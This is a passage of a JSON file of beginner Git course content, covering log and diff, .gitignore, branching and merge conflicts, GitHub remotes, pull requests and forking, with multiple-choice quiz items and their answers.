              "content": "The 'git log' command shows the commit history of your repository.\n\nBASIC USAGE:\n$ git log\n\nOUTPUT:\ncommit a1b2c3d4e5f6789 (HEAD -> main)\nAuthor: Your Name <you@email.com>\nDate:   Mon Jan 15 10:30:00 2025 -0500\n\n    feat: Add Calculator class with add method\n\ncommit 9876543210abcdef\nAuthor: Your Name <you@email.com>\nDate:   Sun Jan 14 15:45:00 2025 -0500\n\n    Initial project setup\n\n\nUSEFUL VARIATIONS:\n\n$ git log --oneline              # Compact one-line format\na1b2c3d feat: Add Calculator class\n9876543 Initial project setup\n\n$ git log -n 3                   # Show only last 3 commits\n\n$ git log --stat                 # Show files changed in each commit\n\n$ git log --graph                # Show branching visually\n\n$ git log --author='Name'        # Filter by author\n\n$ git log --since='2025-01-01'   # Filter by date\n\n\nEXITING THE LOG:\nIf the log is longer than your terminal, use:\n- Press 'q' to quit\n- Press Space to scroll down\n- Press 'b' to scroll up"
            },
            {
              "type": "KEY_POINT",
              "title": "git diff - Comparing Changes",
              "content": "The 'git diff' command shows exactly what changed in your files.\n\nCOMMON USES:\n\n1. See unstaged changes (working directory vs staging area):\n   $ git diff\n\n2. See staged changes (staging area vs last commit):\n   $ git diff --staged\n   or\n   $ git diff --cached\n\n3. See all changes since last commit:\n   $ git diff HEAD\n\n4. Compare two commits:\n   $ git diff abc1234 def5678\n\n5. Compare with previous commit:\n   $ git diff HEAD~1\n   (HEAD~1 means 'one commit before HEAD')\n\n6. Diff a specific file:\n   $ git diff Calculator.java\n\n\nREADING DIFF OUTPUT:\n\n- Lines starting with '+' are ADDITIONS (green)\n- Lines starting with '-' are DELETIONS (red)\n- Lines starting with '@@' show line numbers\n- Context lines (unchanged) have no prefix\n\nExample output:\n@@ -1,5 +1,8 @@\n public class Calculator {\n     public int add(int a, int b) {\n         return a + b;\n     }\n+\n+    public int subtract(int a, int b) {\n+        return a - b;\n+    }\n }"
            },
            {
              "type": "EXAMPLE",
              "title": "The .gitignore File",
              "content": "The .gitignore file tells Git which files to ignore (never track).\n\nCREATING A .gitignore FOR JAVA PROJECTS:\n\nCreate a file named '.gitignore' in your project root:",
              "code": "# .gitignore for Java projects\n\n# Compiled class files\n*.class\n\n# Package files\n*.jar\n*.war\n*.ear\n\n# Build directories\n/target/\n/build/\n/out/\n/bin/\n\n# IDE settings\n.idea/\n*.iml\n.vscode/\n*.swp\n.project\n.classpath\n.settings/\n\n# Maven\n/target/\npom.xml.tag\npom.xml.releaseBackup\n\n# Gradle\n.gradle/\nbuild/\n\n# Logs\n*.log\n\n# OS files\n.DS_Store\nThumbs.db\n\n# Environment files (NEVER commit these!)\n.env\n*.env.local\napplication-secret.properties\n\n# Sensitive data\n**/secrets/\n*.pem\n*.key",
              "language": "gitignore"
            },
            {
              "type": "WARNING",
              "title": "Critical Git Safety Rules",
              "content": "THINGS YOU SHOULD NEVER COMMIT:\n\n1. PASSWORDS AND SECRETS:\n   - Database passwords\n   - API keys and tokens\n   - Private encryption keys\n   - .env files with credentials\n   Once committed, secrets can be found even after deletion!\n\n2. PERSONAL DATA:\n   - Customer information\n   - Email addresses\n   - Payment information\n   If in doubt, don't commit it.\n\n3. LARGE BINARY FILES:\n   - Videos, large images\n   - Database dumps\n   - Compiled executables\n   Git is optimized for text files, not binaries.\n\n4. IDE AND OS FILES:\n   - .idea/, .vscode/\n   - .DS_Store, Thumbs.db\n   These are personal to your setup.\n\n\nIF YOU ACCIDENTALLY COMMIT SECRETS:\n1. Change the password/key IMMEDIATELY\n2. The secret is already exposed - treat it as compromised\n3. Use 'git filter-branch' or BFG Repo Cleaner to remove from history\n4. Force push the cleaned history\n\nPREVENTION:\n- Set up .gitignore BEFORE your first commit\n- Use environment variables for secrets\n- Review 'git diff --staged' before every commit"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "git-lesson-2-mc-1",
              "title": "Understanding git add",
              "description": "What does the git add command do?",
              "question": "What is the purpose of the 'git add' command?",
              "options": [
                "It creates a new commit in the repository",
                "It moves changes from the working directory to the staging area",
                "It uploads files to GitHub",
                "It creates a new file in the project"
              ],
              "correctAnswer": 1,
              "explanation": "The 'git add' command moves changes from your working directory to the staging area, preparing them to be included in the next commit. It doesn't create commits (that's 'git commit') or upload files (that's 'git push').",
              "difficulty": "beginner"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "git-lesson-2-mc-2",
              "title": "Good Commit Messages",
              "description": "Which commit message follows best practices?",
              "question": "Which of these is the BEST commit message?",
              "options": [
                "fixed bug",
                "Changes to UserService.java",
                "Fix null pointer exception in password validation",
                "update"
              ],
              "correctAnswer": 2,
              "explanation": "A good commit message is specific about WHAT was changed and WHY. 'Fix null pointer exception in password validation' clearly describes the bug fixed and where it occurred. The other options are too vague to be useful when reviewing history.",
              "difficulty": "beginner"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "git-lesson-2-mc-3",
              "title": "The .gitignore File",
              "description": "Understanding what should be in .gitignore",
              "question": "Which of these should typically be in a Java project's .gitignore file?",
              "options": [
                "*.java files",
                "README.md",
                "*.class files and .idea/ directory",
                "All test files"
              ],
              "correctAnswer": 2,
              "explanation": "The .gitignore should include compiled files (*.class), IDE settings (.idea/, .vscode/), and build output directories. Source files (*.java), documentation (README.md), and tests should be committed and tracked.",
              "difficulty": "beginner"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "git-lesson-2-mc-4",
              "title": "Viewing Changes",
              "description": "Which command shows uncommitted changes?",
              "question": "You modified a file but haven't staged it yet. Which command shows what you changed?",
              "options": [
                "git log",
                "git status",
                "git diff",
                "git show"
              ],
              "correctAnswer": 2,
              "explanation": "The 'git diff' command shows the actual content changes in your working directory compared to the staging area. 'git status' shows which files changed but not the content. 'git log' shows commit history, not uncommitted changes.",
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "git-lesson-3",
          "title": "Lesson 3.3: Branching & Merging",
          "moduleId": "module-git",
          "order": 3,
          "estimatedMinutes": 45,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Parallel Development",
              "content": "Imagine you're building a calculator app. Your calculator works perfectly for addition and subtraction. Now you want to add new features:\n\n1. Multiplication and division\n2. A history feature to show past calculations\n3. A graphing mode for visualizing equations\n\nProblem: If you work on all three simultaneously in the same code:\n- Feature 1 might break while working on Feature 2\n- If Feature 3 has a bug, it's mixed in with Features 1 and 2\n- Your teammate working on Feature 1 will conflict with your Feature 2 changes\n- You can't release Feature 1 (which is done) without also releasing buggy Feature 3\n\nYou need a way to:\n✓ Work on features independently\n✓ Keep the main code stable\n✓ Switch between features easily\n✓ Combine features when they're ready\n\nThis is exactly what BRANCHES do!"
            },
            {
              "type": "KEY_POINT",
              "title": "Branches: Parallel Universes for Your Code",
              "content": "A BRANCH is an independent line of development.\n\nThink of it like a tree:\n- The MAIN branch (trunk) is your stable, production-ready code\n- FEATURE branches (branches) grow from the trunk to develop new features\n- When a feature is complete, you MERGE it back to the trunk\n\nVisually:\n                    feature/add-history\n                   /\nmain: A---B---C---D---E---F---G\n                       \\\n                        feature/multiplication\n\nEach branch has its own separate timeline:\n- main: The stable, working version\n- feature/add-history: Experimental history feature\n- feature/multiplication: New math operations\n\nKEY BENEFITS:\n1. ISOLATION: Bugs in one branch don't affect others\n2. EXPERIMENTATION: Try risky changes safely\n3. COLLABORATION: Different people work on different branches\n4. ORGANIZATION: Keep work-in-progress separate from stable code\n\nBRANCHES ARE CHEAP:\n- Creating a branch takes milliseconds\n- Switching branches is instant\n- Having many branches costs almost nothing"
            },
            {
              "type": "THEORY",
              "title": "Creating and Switching Branches",
              "content": "VIEWING BRANCHES:\n\n$ git branch              # List local branches\n* main                    # The * shows current branch\n  feature/login\n  feature/payment\n\n$ git branch -a           # List all branches (including remote)\n\n\nCREATING A NEW BRANCH:\n\n$ git branch feature/add-multiply    # Create branch\n$ git checkout feature/add-multiply  # Switch to it\n\nOr use the shorthand:\n$ git checkout -b feature/add-multiply  # Create AND switch\n\nOr the modern way (Git 2.23+):\n$ git switch -c feature/add-multiply    # Create AND switch\n\n\nSWITCHING BRANCHES:\n\n$ git checkout main       # Switch to main branch\n$ git switch main         # Modern alternative\n\nWhen you switch branches:\n- Your working directory changes to that branch's files\n- It's like stepping into a parallel universe\n- Uncommitted changes come with you (be careful!)\n\n\nDELETING A BRANCH:\n\n$ git branch -d feature/old-branch    # Delete (safe - only if merged)\n$ git branch -D feature/old-branch    # Force delete (even if not merged)"
            },
            {
              "type": "EXAMPLE",
              "title": "Practical Branching Workflow",
              "content": "Let's create a feature branch, make changes, and prepare to merge.",
              "code": "# Start on main branch with a working Calculator\n$ git branch\n* main\n\n# Create and switch to a new feature branch\n$ git switch -c feature/add-multiply\nSwitched to a new branch 'feature/add-multiply'\n\n# Verify we're on the new branch\n$ git branch\n  main\n* feature/add-multiply\n\n# Make changes to Calculator.java - add multiply method\n$ echo '    public int multiply(int a, int b) {\n        return a * b;\n    }' >> Calculator.java\n\n# Stage and commit the changes\n$ git add Calculator.java\n$ git commit -m 'feat: Add multiply method to Calculator'\n[feature/add-multiply b2c3d4e] feat: Add multiply method to Calculator\n 1 file changed, 3 insertions(+)\n\n# View the log - shows our new commit\n$ git log --oneline\nb2c3d4e (HEAD -> feature/add-multiply) feat: Add multiply method\na1b2c3d (main) feat: Add Calculator with add method\n\n# Switch back to main - notice the multiply code disappears!\n$ git switch main\n$ cat Calculator.java   # Only has add method - multiply isn't here\n\n# Switch back to feature branch - multiply code reappears!\n$ git switch feature/add-multiply\n$ cat Calculator.java   # Has both add and multiply methods",
              "language": "bash"
            },
            {
              "type": "KEY_POINT",
              "title": "Merging: Combining Branches",
              "content": "MERGING combines changes from one branch into another.\n\nTypical workflow:\n1. Complete your feature on a feature branch\n2. Switch to main (the target branch)\n3. Merge the feature branch into main\n\nBASIC MERGE SYNTAX:\n\n$ git switch main                     # Go to target branch\n$ git merge feature/add-multiply      # Merge feature into main\n\n\nTYPES OF MERGES:\n\n1. FAST-FORWARD MERGE:\n   If main hasn't changed since you branched:\n   \n   Before:   main: A---B\n                        \\\n             feature:    C---D\n   \n   After:    main: A---B---C---D\n   \n   Git just moves the main pointer forward.\n\n2. THREE-WAY MERGE (Merge Commit):\n   If main has new commits since you branched:\n   \n   Before:   main: A---B---E---F\n                        \\\n             feature:    C---D\n   \n   After:    main: A---B---E---F---M\n                        \\         /\n             feature:    C---D---/\n   \n   Git creates a new 'merge commit' (M) that combines both histories.\n\n\nAFTER MERGING:\n$ git branch -d feature/add-multiply  # Delete the merged branch\n\nKeep your branch list clean - delete branches after merging!"
            },
            {
              "type": "THEORY",
              "title": "Handling Merge Conflicts",
              "content": "A MERGE CONFLICT happens when Git can't automatically combine changes.\n\nWHEN DO CONFLICTS OCCUR?\n- Two branches modified the same line in the same file\n- One branch deleted a file that another branch modified\n\nWHAT HAPPENS DURING A CONFLICT:\n\n$ git merge feature/new-algorithm\nAuto-merging Calculator.java\nCONFLICT (content): Merge conflict in Calculator.java\nAutomatic merge failed; fix conflicts and then commit the result.\n\n\nWHAT THE CONFLICT LOOKS LIKE IN THE FILE:\n\npublic int add(int a, int b) {\n<<<<<<< HEAD\n    // Main branch version\n    return a + b;\n=======\n    // Feature branch version\n    int sum = a + b;\n    System.out.println(\"Sum: \" + sum);\n    return sum;\n>>>>>>> feature/new-algorithm\n}\n\nMEANING:\n- <<<<<<< HEAD: Start of your current branch's version\n- =======: Separator between the two versions\n- >>>>>>> feature/...: Start of incoming branch's version\n\n\nRESOLVING THE CONFLICT:\n\n1. Open the file in your editor\n2. Decide which version to keep (or combine them)\n3. Remove the conflict markers (<<<<, ====, >>>>)\n4. Save the file\n5. Stage and commit:\n   $ git add Calculator.java\n   $ git commit -m 'Resolve merge conflict in Calculator.java'"
            },
            {
              "type": "EXAMPLE",
              "title": "Complete Branch and Merge Example",
              "content": "Here's a complete workflow showing branching, making changes, merging, and handling a conflict.",
              "code": "# === SETUP: Start with a clean main branch ===\n$ git switch main\n$ git log --oneline\na1b2c3d (HEAD -> main) Initial Calculator with add method\n\n# === STEP 1: Create and work on feature branch ===\n$ git switch -c feature/subtract\n$ # Edit Calculator.java to add subtract method\n$ git add Calculator.java\n$ git commit -m 'feat: Add subtract method'\n\n# === STEP 2: Meanwhile, someone else updates main ===\n$ git switch main\n$ # Edit Calculator.java to add comments\n$ git add Calculator.java  \n$ git commit -m 'docs: Add comments to add method'\n\n# === STEP 3: Merge feature back to main ===\n$ git merge feature/subtract\n# If no conflict: Merge made by the 'ort' strategy.\n# If conflict: CONFLICT (content): Merge conflict in Calculator.java\n\n# === STEP 4: If there's a conflict, resolve it ===\n$ git status  # Shows conflicted files\n# Edit Calculator.java - remove conflict markers, keep both changes\n$ git add Calculator.java\n$ git commit -m 'Merge feature/subtract into main'\n\n# === STEP 5: Clean up ===\n$ git branch -d feature/subtract   # Delete merged branch\n$ git log --oneline --graph        # See the merge visually\n* e5f6g7h (HEAD -> main) Merge feature/subtract into main\n|\\\n| * c3d4e5f (feature/subtract) feat: Add subtract method\n* | b2c3d4e docs: Add comments to add method\n|/\n* a1b2c3d Initial Calculator with add method",
              "language": "bash"
            },
            {
              "type": "KEY_POINT",
              "title": "Branch Naming Conventions",
              "content": "Good branch names make collaboration easier. Here are common conventions:\n\nFEATURE BRANCHES:\n- feature/user-authentication\n- feature/add-payment-processing\n- feature/dark-mode\n- feat/login (shorter version)\n\nBUG FIX BRANCHES:\n- bugfix/login-error\n- fix/null-pointer-in-checkout\n- hotfix/security-patch (urgent production fix)\n\nOTHER COMMON PATTERNS:\n- release/v1.2.0 (preparing a release)\n- docs/update-readme\n- refactor/simplify-validation\n- test/add-unit-tests\n- experiment/try-new-algorithm\n\nRULES:\n✓ Use lowercase\n✓ Use hyphens or slashes to separate words\n✓ Be descriptive but concise\n✓ Include ticket/issue number if applicable: feature/JIRA-123-user-login\n\n✗ Avoid spaces (use hyphens)\n✗ Avoid special characters except / and -\n✗ Don't use your name as a branch: john-branch (not descriptive)\n\nTIP: If your team uses a project management tool (Jira, GitHub Issues), reference the ticket number in the branch name for traceability."
            },
            {
              "type": "WARNING",
              "title": "Common Branching Mistakes",
              "content": "MISTAKES TO AVOID:\n\n1. WORKING DIRECTLY ON MAIN:\n   Problem: Your incomplete work affects everyone\n   Solution: Always create a feature branch for new work\n\n2. LONG-LIVED FEATURE BRANCHES:\n   Problem: The longer a branch lives, the harder it is to merge\n   Solution: Keep branches short-lived (days, not weeks)\n   Best practice: Merge to main at least once per week\n\n3. NOT PULLING BEFORE BRANCHING:\n   Problem: Your feature branch starts from outdated code\n   Solution: Always pull latest main before creating a branch:\n   $ git switch main\n   $ git pull origin main\n   $ git switch -c feature/new-feature\n\n4. FORGETTING TO DELETE MERGED BRANCHES:\n   Problem: Branch list becomes cluttered and confusing\n   Solution: Delete branches immediately after merging:\n   $ git branch -d feature/completed-work\n\n5. MERGE CONFLICT PANIC:\n   Problem: Seeing conflicts causes stress and mistakes\n   Solution: Conflicts are normal! Take your time, understand both sides, test after resolving.\n\n6. FORCE PUSHING SHARED BRANCHES:\n   Problem: Overwrites teammates' work\n   Solution: Never 'git push --force' on shared branches\n   Only force push on your personal feature branches"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "git-lesson-3-mc-1",
              "title": "Understanding Branches",
              "description": "What is the primary purpose of Git branches?",
              "question": "What is the PRIMARY purpose of Git branches?",
              "options": [
                "To backup your code to multiple locations",
                "To work on features independently without affecting the main codebase",
                "To make your repository faster",
                "To share code with other developers"
              ],
              "correctAnswer": 1,
              "explanation": "Branches allow you to work on features, fixes, or experiments in isolation. Changes on a branch don't affect the main codebase until you explicitly merge them. This keeps your main branch stable while development continues.",
              "difficulty": "beginner"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "git-lesson-3-mc-2",
              "title": "Creating Branches",
              "description": "Which command creates a new branch AND switches to it?",
              "question": "Which command creates a new branch named 'feature/login' AND switches to it in one step?",
              "options": [
                "git branch feature/login",
                "git checkout feature/login",
                "git switch -c feature/login",
                "git merge feature/login"
              ],
              "correctAnswer": 2,
              "explanation": "The 'git switch -c feature/login' command (or 'git checkout -b feature/login') creates a new branch AND switches to it in one step. Just 'git branch' only creates the branch without switching. Just 'git checkout' without -b switches to an existing branch.",
              "difficulty": "beginner"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "git-lesson-3-mc-3",
              "title": "Merge Conflicts",
              "description": "When does a merge conflict occur?",
              "question": "When does a merge conflict occur?",
              "options": [
                "Whenever you merge any two branches",
                "When two branches have modified the same lines in the same file",
                "When you try to merge a branch that doesn't exist",
                "When your internet connection is lost during a merge"
              ],
              "correctAnswer": 1,
              "explanation": "Merge conflicts occur when Git cannot automatically determine which version to keep - specifically when two branches have modified the same lines in the same file. Git can automatically merge changes to different files or different lines in the same file.",
              "difficulty": "beginner"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "git-lesson-3-mc-4",
              "title": "Branch Naming",
              "description": "Which branch name follows best practices?",
              "question": "Which of these branch names follows best practices?",
              "options": [
                "MyNewFeature",
                "john_work_jan_2025",
                "feature/add-user-authentication",
                "NEW FEATURE LOGIN"
              ],
              "correctAnswer": 2,
              "explanation": "Good branch names use lowercase, are descriptive about what the branch contains, and use a prefix indicating the type of work (feature/, bugfix/, etc.). 'feature/add-user-authentication' clearly indicates it's a feature branch for user authentication. Avoid spaces, capital letters, and personal identifiers.",
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "git-lesson-4",
          "title": "Lesson 3.4: GitHub & Collaboration",
          "moduleId": "module-git",
          "order": 4,
          "estimatedMinutes": 40,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Remote Repositories: Beyond Your Computer",
              "content": "So far, all your Git work has been LOCAL - on your own computer. But what if:\n- Your computer crashes and you lose everything?\n- You want to work from a different machine?\n- You need to collaborate with teammates?\n\nThis is where REMOTE REPOSITORIES come in.\n\nA REMOTE is a copy of your repository stored somewhere else, usually on a server like GitHub, GitLab, or Bitbucket.\n\nKEY CONCEPTS:\n\n1. ORIGIN: The default name for your main remote repository\n   When you clone a repo, Git automatically names that remote 'origin'\n\n2. PUSH: Upload your local commits to the remote\n   Your work becomes visible to others and is backed up\n\n3. PULL: Download changes from the remote to your local repo\n   Get your teammates' work onto your machine\n\n4. CLONE: Create a local copy of a remote repository\n   Start working on an existing project\n\n5. FORK: Create your own remote copy of someone else's repository\n   Used for contributing to open source projects"
            },
            {
              "type": "KEY_POINT",
              "title": "Setting Up GitHub",
              "content": "STEP 1: Create a GitHub Account\n- Go to github.com and sign up\n- Choose a professional username (you'll use it forever!)\n- Set up two-factor authentication for security\n\nSTEP 2: Create an SSH Key (Recommended)\nSSH keys let you push/pull without entering your password each time.\n\n$ ssh-keygen -t ed25519 -C 'your.email@example.com'\n  # Press Enter to accept default location\n  # Enter a passphrase (optional but recommended)\n\n$ cat ~/.ssh/id_ed25519.pub\n  # Copy this output\n\nIn GitHub:\n- Go to Settings > SSH and GPG keys\n- Click 'New SSH key'\n- Paste your public key and save\n\nSTEP 3: Test Connection\n$ ssh -T git@github.com\n  Hi username! You've successfully authenticated...\n\nALTERNATIVE: Use HTTPS with Personal Access Token\n- GitHub > Settings > Developer settings > Personal access tokens\n- Generate a token with 'repo' scope\n- Use this token as your password when prompted"
            },
            {
              "type": "EXAMPLE",
              "title": "Connecting Local Repo to GitHub",
              "content": "There are two ways to connect your code to GitHub:\n\nOPTION 1: Push an existing local repository to GitHub",
              "code": "# 1. Create a new repository on GitHub (github.com/new)\n#    - Give it a name (e.g., 'java-calculator')\n#    - DON'T initialize with README (we have local commits)\n\n# 2. In your local project, add the remote\n$ cd JavaCalculator\n$ git remote add origin git@github.com:yourusername/java-calculator.git\n\n# 3. Push your code to GitHub\n$ git push -u origin main\n  # -u sets up tracking (only needed first time)\n\n# Verify the remote\n$ git remote -v\norigin  git@github.com:yourusername/java-calculator.git (fetch)\norigin  git@github.com:yourusername/java-calculator.git (push)\n\n\n# OPTION 2: Clone an existing GitHub repository\n$ git clone git@github.com:someuser/some-project.git\n$ cd some-project\n# You're ready to work - remote is already configured!",
              "language": "bash"
            },
            {
              "type": "THEORY",
              "title": "Push and Pull: Syncing with Remote",
              "content": "GIT PUSH - Upload Local Changes\n\nSends your commits from local to remote:\n$ git push origin main\n\nBreakdown:\n- 'push': Upload commits\n- 'origin': The remote name\n- 'main': The branch to push\n\nIf you set up tracking (-u flag), you can just use:\n$ git push\n\n\nGIT PULL - Download Remote Changes\n\nGets commits from remote to your local repo:\n$ git pull origin main\n\nOr simply:\n$ git pull\n\nWHAT PULL DOES:\n1. Fetches changes from remote (git fetch)\n2. Merges them into your current branch (git merge)\n\n\nGIT FETCH - Download Without Merging\n\nSometimes you want to see changes before merging:\n$ git fetch origin\n$ git log origin/main  # See what's new\n$ git merge origin/main  # Merge when ready\n\n\nTYPICAL WORKFLOW:\n1. Start your day: git pull (get latest changes)\n2. Do your work: edit, add, commit\n3. End your day: git push (share your changes)\n4. Repeat!"
            },
            {
              "type": "KEY_POINT",
              "title": "Pull Requests: The Heart of Collaboration",
              "content": "A PULL REQUEST (PR) is a request to merge your branch into another branch.\n\nIt's called a 'pull' request because you're asking the maintainer to 'pull' your changes into their branch.\n\nWHY USE PULL REQUESTS?\n1. CODE REVIEW: Teammates can review your code before it's merged\n2. DISCUSSION: Discuss changes, ask questions, suggest improvements\n3. QUALITY GATE: Run automated tests before merging\n4. DOCUMENTATION: PRs create a record of why changes were made\n\nPR WORKFLOW:\n\n1. Create a feature branch and push it:\n   $ git switch -c feature/add-validation\n   $ # make changes, commit\n   $ git push -u origin feature/add-validation\n\n2. On GitHub:\n   - Click 'Compare & pull request' (or go to Pull Requests > New)\n   - Write a description of your changes\n   - Request reviewers\n   - Submit the PR\n\n3. Reviewers examine your code:\n   - Leave comments on specific lines\n   - Request changes if needed\n   - Approve when satisfied\n\n4. Merge the PR:\n   - Click 'Merge pull request' on GitHub\n   - Delete the feature branch\n\n5. Update your local main:\n   $ git switch main\n   $ git pull origin main"
            },
            {
              "type": "EXAMPLE",
              "title": "Complete GitHub Collaboration Workflow",
              "content": "Here's a realistic example of working on a team project:",
              "code": "# === MORNING: Start fresh ===\n$ git switch main\n$ git pull origin main    # Get latest changes from team\n\n# === CREATE FEATURE BRANCH ===\n$ git switch -c feature/user-profile-page\n\n# === DO YOUR WORK ===\n# ... write code, make commits ...\n$ git add UserProfile.java\n$ git commit -m 'feat: Add user profile page layout'\n$ git add ProfileService.java\n$ git commit -m 'feat: Add service to fetch user data'\n\n# === PUSH YOUR BRANCH ===\n$ git push -u origin feature/user-profile-page\n\n# === CREATE PULL REQUEST ON GITHUB ===\n# Go to github.com/yourteam/project\n# Click 'Compare & pull request'\n# Fill in:\n#   Title: Add user profile page\n#   Description: \n#     - Added UserProfile component\n#     - Integrated with ProfileService\n#     - Includes responsive layout\n# Request review from teammate\n# Submit!\n\n# === RESPOND TO REVIEW FEEDBACK ===\n# Reviewer comments: 'Add null check for empty profile'\n$ git switch feature/user-profile-page\n# ... make the requested changes ...\n$ git add UserProfile.java\n$ git commit -m 'fix: Add null check for empty profile'\n$ git push\n# The PR automatically updates!\n\n# === AFTER APPROVAL: MERGE ON GITHUB ===\n# Click 'Merge pull request'\n# Click 'Delete branch' (on GitHub)\n\n# === CLEAN UP LOCALLY ===\n$ git switch main\n$ git pull origin main    # Get the merged changes\n$ git branch -d feature/user-profile-page  # Delete local branch",
              "language": "bash"
            },
            {
              "type": "THEORY",
              "title": "Writing Good Pull Requests",
              "content": "A good PR description helps reviewers understand your changes quickly.\n\nPR TITLE:\n- Be concise but descriptive\n- Use the same prefixes as commits: feat:, fix:, docs:, etc.\n\nExamples:\n✓ 'feat: Add user authentication with JWT'\n✓ 'fix: Resolve null pointer in checkout flow'\n✗ 'Updates' (too vague)\n✗ 'Fixed that thing we talked about' (not descriptive)\n\nPR DESCRIPTION TEMPLATE:\n\n## Summary\nBrief description of what this PR does and why.\n\n## Changes\n- Added UserAuthentication class\n- Integrated JWT token validation\n- Updated login endpoint to return tokens\n\n## Testing\n- [ ] Unit tests pass\n- [ ] Manual testing completed\n- [ ] Tested edge cases: expired token, invalid token\n\n## Screenshots (if applicable)\n[Add screenshots for UI changes]\n\n## Related Issues\nCloses #123\n\n\nPR ETIQUETTE:\n1. Keep PRs small and focused (easier to review)\n2. Respond promptly to review comments\n3. Be open to feedback - it makes code better\n4. Thank reviewers for their time"
            },
            {
              "type": "KEY_POINT",
              "title": "Code Review Best Practices",
              "content": "CODE REVIEW is one of the most valuable practices in software development.\n\nAS A REVIEWER:\n\n1. Be constructive and respectful:\n   ✓ 'Consider using a constant here for readability'\n   ✗ 'This is wrong'\n\n2. Ask questions instead of demanding:\n   ✓ 'What happens if userId is null?'\n   ✗ 'You forgot null check'\n\n3. Praise good code:\n   ✓ 'Nice use of the builder pattern here!'\n   People learn from positive feedback too.\n\n4. Focus on:\n   - Logic errors and bugs\n   - Code clarity and maintainability\n   - Missing edge cases\n   - Security issues\n   - Performance concerns\n\n5. Approve when requirements are met:\n   Don't block for minor style preferences.\n\n\nAS A PR AUTHOR:\n\n1. Don't take feedback personally\n   Reviewers are improving the code, not criticizing you.\n\n2. Respond to all comments\n   Either make the change or explain why not.\n\n3. Say thank you\n   Reviewing takes time and mental energy.\n\n4. Learn from feedback\n   Use reviews to grow as a developer."
            },
            {
              "type": "EXAMPLE",
              "title": "Forking and Contributing to Open Source",
              "content": "Contributing to open source is a great way to learn and build your portfolio. Here's the workflow:",
              "code": "# === STEP 1: FORK THE REPOSITORY ===\n# On GitHub: Click 'Fork' button on the project page\n# This creates YOUR copy at github.com/YOU/project\n\n# === STEP 2: CLONE YOUR FORK ===\n$ git clone git@github.com:YOUR-USERNAME/project.git\n$ cd project\n\n# === STEP 3: ADD ORIGINAL AS 'UPSTREAM' ===\n$ git remote add upstream git@github.com:ORIGINAL-OWNER/project.git\n$ git remote -v\norigin    git@github.com:YOUR-USERNAME/project.git (fetch)\nupstream  git@github.com:ORIGINAL-OWNER/project.git (fetch)\n\n# === STEP 4: CREATE A BRANCH FOR YOUR CONTRIBUTION ===\n$ git switch -c fix/typo-in-readme\n\n# === STEP 5: MAKE YOUR CHANGES ===\n$ # edit files...\n$ git add README.md\n$ git commit -m 'docs: Fix typo in installation instructions'\n\n# === STEP 6: PUSH TO YOUR FORK ===\n$ git push -u origin fix/typo-in-readme\n\n# === STEP 7: CREATE PULL REQUEST ===\n# Go to the ORIGINAL project on GitHub\n# Click 'New Pull Request'\n# Choose 'compare across forks'\n# Select your fork and branch\n# Write a description and submit!\n\n# === KEEP YOUR FORK UPDATED ===\n$ git fetch upstream\n$ git switch main\n$ git merge upstream/main\n$ git push origin main",
              "language": "bash"
            },
            {
              "type": "WARNING",
              "title": "Common GitHub Mistakes",
              "content": "MISTAKES TO AVOID:\n\n1. PUSHING TO MAIN DIRECTLY:\n   Problem: Bypasses code review, can introduce bugs\n   Solution: Always use feature branches and PRs\n\n2. FORCE PUSHING TO SHARED BRANCHES:\n   Problem: Destroys teammates' work, causes sync issues\n   Solution: Never use 'git push --force' on shared branches\n   Only force push on your own feature branches if needed\n\n3. NOT PULLING BEFORE STARTING WORK:\n   Problem: Your changes conflict with recent updates\n   Solution: Always 'git pull' on main before creating a branch\n\n4. IGNORING CI/CD FAILURES:\n   Problem: Broken builds get merged into main\n   Solution: Fix failing tests before merging\n\n5. HUGE PULL REQUESTS:\n   Problem: Hard to review, high risk of bugs\n   Solution: Keep PRs small (<400 lines is a good target)\n   Break large features into multiple smaller PRs\n\n6. NOT READING PROJECT CONTRIBUTION GUIDELINES:\n   Problem: Your PR doesn't follow project conventions\n   Solution: Always read CONTRIBUTING.md before contributing\n\n7. COMMITTING SENSITIVE DATA:\n   Problem: Passwords/keys exposed publicly forever\n   Solution: Use .gitignore, environment variables\n   If exposed: rotate the credentials IMMEDIATELY"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "git-lesson-4-mc-1",
              "title": "Understanding Remotes",
              "description": "What is a remote repository?",
              "question": "What is the purpose of a remote repository?",
              "options": [
                "A faster version of your local repository",
                "A copy of your repository stored on a server for backup and collaboration",
                "A repository that only stores remote images",
                "A temporary storage for deleted files"
              ],
              "correctAnswer": 1,
              "explanation": "A remote repository is a copy of your repository stored on a server (like GitHub). It serves as a backup for your code and enables collaboration with others. Team members can push their changes to and pull others' changes from the remote.",
              "difficulty": "beginner"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "git-lesson-4-mc-2",
              "title": "Push vs Pull",
              "description": "Understanding the difference between push and pull",
              "question": "What is the difference between 'git push' and 'git pull'?",
              "options": [
                "They do the same thing",
                "Push creates branches, pull deletes them",
                "Push uploads local commits to the remote; pull downloads remote commits to local",
                "Push is for GitHub, pull is for GitLab"
              ],
              "correctAnswer": 2,
              "explanation": "git push uploads your local commits to the remote repository, sharing your work with others. git pull downloads commits from the remote repository to your local machine, getting others' work. They're opposite operations for syncing between local and remote.",
              "difficulty": "beginner"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "git-lesson-4-mc-3",
              "title": "Pull Requests",
              "description": "Understanding the purpose of pull requests",
              "question": "What is the PRIMARY purpose of a Pull Request?",
              "options": [
                "To download code from GitHub",
                "To automatically fix merge conflicts",
                "To request code review and approval before merging changes",
                "To delete branches from the remote"
              ],
              "correctAnswer": 2,
              "explanation": "A Pull Request (PR) is a request to merge your branch into another branch, but more importantly, it's a mechanism for code review. Team members can review your changes, leave comments, suggest improvements, and approve the merge. This improves code quality and knowledge sharing.",
